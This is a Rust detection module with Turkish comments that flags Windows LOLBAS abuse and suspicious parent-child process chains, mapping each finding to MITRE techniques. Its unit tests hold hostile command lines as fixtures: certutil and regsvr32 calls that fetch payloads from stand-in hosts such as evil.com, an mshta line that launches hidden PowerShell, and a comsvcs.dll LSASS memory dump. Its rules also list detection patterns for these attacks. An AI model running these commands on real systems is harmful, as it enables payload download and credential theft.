use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use sysinfo::System;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolbasDetectionReport {
    pub pid: u32,
    pub name: String,
    pub parent_pid: Option<u32>,
    pub parent_name: String,
    pub cmd: String,
    pub category: String,
    pub mitre_id: String,
    pub severity: String,
    pub matched_binary: String,
    pub description: String,
    pub killed: bool,
}

pub struct LolbasHunter;

impl LolbasHunter {
    /// Sistemde çalışan tüm süreçleri LOLBAS kötüye kullanımı ve ebeveyn-çocuk anomalileri açısından denetler
    pub fn scan_all(kill_critical: bool) -> Result<Vec<LolbasDetectionReport>> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut reports = Vec::new();

        // PID -> İsim haritası (Ebeveyn adını bulmak için)
        let mut pid_to_name: HashMap<u32, String> = HashMap::new();
        for (pid, proc_info) in sys.processes() {
            pid_to_name.insert(pid.as_u32(), proc_info.name().to_string_lossy().to_string());
        }

        for (pid, proc_info) in sys.processes() {
            let pid_u32 = pid.as_u32();
            let name = proc_info.name().to_string_lossy().to_string();
            let parent_pid = proc_info.parent().map(|p| p.as_u32());
            let parent_name = parent_pid
                .and_then(|ppid| pid_to_name.get(&ppid).cloned())
                .unwrap_or_else(|| "Bilinmiyor".to_string());

            let cmd_parts: Vec<String> = proc_info
                .cmd()
                .iter()
                .map(|c| c.to_string_lossy().to_string())
                .collect();
            let full_cmd = cmd_parts.join(" ");

            let detection_opt = Self::inspect_process(&name, &parent_name, &full_cmd);

            if let Some((cat, mitre, sev, matched_bin, desc)) = detection_opt {
                let mut killed = false;
                if kill_critical && (sev == "Critical" || sev == "High") {
                    if let Ok(k) = crate::engines::ProcessScanner::kill_process_by_pid(pid_u32) {
                        killed = k;
                    }
                }

                reports.push(LolbasDetectionReport {
                    pid: pid_u32,
                    name,
                    parent_pid,
                    parent_name,
                    cmd: full_cmd,
                    category: cat,
                    mitre_id: mitre,
                    severity: sev,
                    matched_binary: matched_bin,
                    description: desc,
                    killed,
                });
            }
        }

        Ok(reports)
    }

    /// Tekil bir sürecin adını, ebeveyn adını ve komut satırını LOLBAS ve anomali kurallarıyla inceler
    pub fn inspect_process(
        name: &str,
        parent_name: &str,
        cmd: &str,
    ) -> Option<(String, String, String, String, String)> {
        let name_lower = name.to_lowercase();
        let parent_lower = parent_name.to_lowercase();
        let cmd_lower = cmd.to_lowercase();

        // 1. Ebeveyn - Çocuk Anomalileri
        let office_apps = ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"];
        let browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe"];
        let web_servers = ["w3wp.exe", "sqlservr.exe", "tomcat.exe", "nginx.exe", "httpd.exe"];
        let shells = ["cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "certutil.exe", "mshta.exe", "rundll32.exe"];

        if office_apps.iter().any(|app| parent_lower.contains(app)) && shells.iter().any(|sh| name_lower.contains(sh)) {
            return Some((
                "Ofis Makro Zararlısı Süreç Başlatma".to_string(),
                "T1566.001".to_string(),
                "Critical".to_string(),
                name.to_string(),
                format!(
                    "Ofis uygulaması ({}) tarafından şüpheli kabuk/ikili ({}) başlatıldı. Olası makro (Phishing) saldırısı!",
                    parent_name, name
                ),
            ));
        }

        if browsers.iter().any(|b| parent_lower.contains(b)) && shells.iter().any(|sh| name_lower.contains(sh)) {
            return Some((
                "Tarayıcı İstismarı / İndirme Kabuk Başlatma".to_string(),
                "T1203".to_string(),
                "High".to_string(),
                name.to_string(),
                format!(
                    "Web tarayıcısı ({}) doğrudan bir komut kabuğu ({}) başlattı. Tarayıcı istismarı veya zararlı indirme!",
                    parent_name, name
                ),
            ));
        }

        if web_servers.iter().any(|s| parent_lower.contains(s)) && (name_lower.contains("cmd.exe") || name_lower.contains("powershell.exe") || name_lower.contains("whoami.exe")) {
            return Some((
                "Web Sunucusu / SQL Webshell Komut Yürütme".to_string(),
                "T1505.003".to_string(),
                "Critical".to_string(),
                name.to_string(),
                format!(
                    "Sunucu servisi ({}) komut kabuğu ({}) çalıştırdı. Yüksek ihtimalle Webshell aktif!",
                    parent_name, name
                ),
            ));
        }

        if parent_lower.contains("spoolsv.exe") && (name_lower.contains("cmd.exe") || name_lower.contains("powershell.exe")) {
            return Some((
                "Print Spooler İstismar Girişimi (PrintNightmare)".to_string(),
                "T1068".to_string(),
                "Critical".to_string(),
                name.to_string(),
                "spoolsv.exe servisi doğrudan komut satırı başlattı (PrintNightmare CVE-2021-34527 şüphesi).".to_string(),
            ));
        }

        // 2. LOLBAS Kuralları
        if name_lower.contains("certutil.exe") {
            if cmd_lower.contains("-urlcache") || cmd_lower.contains("/urlcache") || cmd_lower.contains("-split") || cmd_lower.contains("-decode") || cmd_lower.contains("/decode") {
                return Some((
                    "CertUtil ile Dosya İndirme / Base64 Çözme".to_string(),
                    "T1105".to_string(),
                    "High".to_string(),
                    "certutil.exe".to_string(),
                    "certutil.exe parametreleri ile uzaktan dosya indirme veya zararlı decode etme girişimi.".to_string(),
                ));
            }
        } else if name_lower.contains("mshta.exe") {
            if cmd_lower.contains("http://") || cmd_lower.contains("https://") || cmd_lower.contains("javascript:") || cmd_lower.contains("vbscript:") {
                return Some((
                    "MSHTA Proxy Kod Yürütme (Squiblytwo)".to_string(),
                    "T1218.005".to_string(),
                    "Critical".to_string(),
                    "mshta.exe".to_string(),
                    "mshta.exe doğrudan uzak URL veya inline script çalıştırarak antivirüs atlatmaya çalışıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("regsvr32.exe") {
            if (cmd_lower.contains("/s") || cmd_lower.contains("-s")) && (cmd_lower.contains("/u") || cmd_lower.contains("-u")) && (cmd_lower.contains("/i:") || cmd_lower.contains("-i:") || cmd_lower.contains("scrobj.dll")) {
                return Some((
                    "Regsvr32 Squiblydoo COM Scriptlet Yürütme".to_string(),
                    "T1218.010".to_string(),
                    "Critical".to_string(),
                    "regsvr32.exe".to_string(),
                    "regsvr32.exe scrobj.dll veya uzak scriptlet ile hafızada gizli kod yürütmeye çalışıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("rundll32.exe") {
            if cmd_lower.contains("comsvcs.dll") && (cmd_lower.contains("minidump") || cmd_lower.contains("#24")) {
                return Some((
                    "LSASS Bellek Dökümü Girişimi (Comsvcs)".to_string(),
                    "T1003.001".to_string(),
                    "Critical".to_string(),
                    "rundll32.exe".to_string(),
                    "rundll32.exe comsvcs.dll kullanarak LSASS işlem belleğini ve şifreleri diske dökmeye çalışıyor!".to_string(),
                ));
            } else if cmd_lower.contains("javascript:") {
                return Some((
                    "Rundll32 JavaScript Yürütme".to_string(),
                    "T1218.011".to_string(),
                    "High".to_string(),
                    "rundll32.exe".to_string(),
                    "rundll32.exe komut satırından doğrudan JavaScript çalıştırıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("bitsadmin.exe") {
            if cmd_lower.contains("/transfer") || cmd_lower.contains("/addfile") || cmd_lower.contains("/create") {
                return Some((
                    "BITSAdmin Arka Plan Dosya İndirme".to_string(),
                    "T1197".to_string(),
                    "High".to_string(),
                    "bitsadmin.exe".to_string(),
                    "bitsadmin.exe arka planda gizlice dosya indirmek için kullanılıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("wmic.exe") {
            if cmd_lower.contains("process call create") {
                return Some((
                    "WMIC ile Süreç Başlatma".to_string(),
                    "T1047".to_string(),
                    "High".to_string(),
                    "wmic.exe".to_string(),
                    "wmic.exe kullanılarak antivirüs loglarını atlatmak için gizli süreç başlatılıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("cscript.exe") || name_lower.contains("wscript.exe") {
            if cmd_lower.contains("\\temp\\") || cmd_lower.contains("\\appdata\\") || cmd_lower.contains("\\users\\public\\") || cmd_lower.contains("\\\\") {
                return Some((
                    "Geçici / Şüpheli Klasörden VBScript Yürütme".to_string(),
                    "T1059.005".to_string(),
                    "High".to_string(),
                    name.to_string(),
                    "Windows Script Host geçici kullanıcı klasöründen (AppData/Temp/Public) script çalıştırıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("powershell.exe") || name_lower.contains("pwsh.exe") {
            if (cmd_lower.contains("-enc ") || cmd_lower.contains("-encodedcommand ") || cmd_lower.contains(" -e ")) && (cmd_lower.contains("hidden") || cmd_lower.contains("bypass") || cmd_lower.contains("downloadstring") || cmd_lower.contains("iex")) {
                return Some((
                    "Gizlenmiş / Base64 Şifreli PowerShell".to_string(),
                    "T1059.001".to_string(),
                    "High".to_string(),
                    name.to_string(),
                    "PowerShell gizli pencerede Base64 kodlu komut ve web downloadstring/iex çalıştırıyor.".to_string(),
                ));
            }
        } else if name_lower.contains("curl.exe") {
            if (cmd_lower.contains(".exe") || cmd_lower.contains(".dll") || cmd_lower.contains(".ps1") || cmd_lower.contains(".bat") || cmd_lower.contains(".vbs")) && (cmd_lower.contains("-o ") || cmd_lower.contains("-o")) {
                return Some((
                    "Curl ile Yürütülebilir Dosya İndirme".to_string(),
                    "T1105".to_string(),
                    "High".to_string(),
                    "curl.exe".to_string(),
                    "curl.exe uzaktan çalıştırılabilir binary veya script indiriyor.".to_string(),
                ));
            }
        } else if name_lower.contains("schtasks.exe") {
            if cmd_lower.contains("/create") && (cmd_lower.contains("\\temp\\") || cmd_lower.contains("\\appdata\\") || cmd_lower.contains("powershell") || cmd_lower.contains("cmd")) {
                return Some((
                    "Zamanlanmış Görev Kalıcılık Girişimi".to_string(),
                    "T1053.005".to_string(),
                    "High".to_string(),
                    "schtasks.exe".to_string(),
                    "schtasks.exe ile geçici klasörden çalışacak veya kabuk tetikleyecek zamanlanmış görev oluşturuluyor.".to_string(),
                ));
            }
        } else if name_lower.contains("hh.exe") && (cmd_lower.contains("http://") || cmd_lower.contains("https://") || cmd_lower.contains(".chm")) {
            return Some((
                "HTML Help (CHM) İstismarı".to_string(),
                "T1218.001".to_string(),
                "High".to_string(),
                "hh.exe".to_string(),
                "hh.exe kullanılarak CHM dosyası üzerinden zararlı kod yürütülmeye çalışılıyor.".to_string(),
            ));
        } else if name_lower.contains("msiexec.exe") && (cmd_lower.contains("http://") || cmd_lower.contains("https://")) {
            return Some((
                "Uzaktan Sessiz MSI Kurulumu".to_string(),
                "T1218.007".to_string(),
                "High".to_string(),
                "msiexec.exe".to_string(),
                "msiexec.exe uzaktaki web sunucusundan doğrudan MSI paketi yüklemeye çalışıyor.".to_string(),
            ));
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_certutil_download_cradle() {
        let res = LolbasHunter::inspect_process(
            "certutil.exe",
            "cmd.exe",
            "certutil.exe -urlcache -split -f http://malware.com/payload.exe payload.exe",
        );
        assert!(res.is_some());
        let (cat, mitre, sev, _, _) = res.unwrap();
        assert_eq!(cat, "CertUtil ile Dosya İndirme / Base64 Çözme");
        assert_eq!(mitre, "T1105");
        assert_eq!(sev, "High");
    }

    #[test]
    fn test_mshta_proxy_execution() {
        let res = LolbasHunter::inspect_process(
            "mshta.exe",
            "explorer.exe",
            "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell\"\",0,True\"))",
        );
        assert!(res.is_some());
        let (cat, mitre, sev, _, _) = res.unwrap();
        assert_eq!(cat, "MSHTA Proxy Kod Yürütme (Squiblytwo)");
        assert_eq!(mitre, "T1218.005");
        assert_eq!(sev, "Critical");
    }

    #[test]
    fn test_regsvr32_squiblydoo() {
        let res = LolbasHunter::inspect_process(
            "regsvr32.exe",
            "cmd.exe",
            "regsvr32.exe /s /u /i:http://evil.com/file.sct scrobj.dll",
        );
        assert!(res.is_some());
        let (cat, mitre, sev, _, _) = res.unwrap();
        assert_eq!(cat, "Regsvr32 Squiblydoo COM Scriptlet Yürütme");
        assert_eq!(mitre, "T1218.010");
        assert_eq!(sev, "Critical");
    }

    #[test]
    fn test_office_macro_spawning_powershell() {
        let res = LolbasHunter::inspect_process(
            "powershell.exe",
            "winword.exe",
            "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden",
        );
        assert!(res.is_some());
        let (cat, mitre, sev, _, _) = res.unwrap();
        assert_eq!(cat, "Ofis Makro Zararlısı Süreç Başlatma");
        assert_eq!(mitre, "T1566.001");
        assert_eq!(sev, "Critical");
    }

    #[test]
    fn test_rundll32_lsass_dump() {
        let res = LolbasHunter::inspect_process(
            "rundll32.exe",
            "cmd.exe",
            "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 672 dump.bin full",
        );
        assert!(res.is_some());
        let (cat, mitre, sev, _, _) = res.unwrap();
        assert_eq!(cat, "LSASS Bellek Dökümü Girişimi (Comsvcs)");
        assert_eq!(mitre, "T1003.001");
        assert_eq!(sev, "Critical");
    }

    #[test]
    fn test_clean_process() {
        let res = LolbasHunter::inspect_process(
            "notepad.exe",
            "explorer.exe",
            "C:\\Windows\\notepad.exe C:\\notes.txt",
        );
        assert!(res.is_none());
    }
}
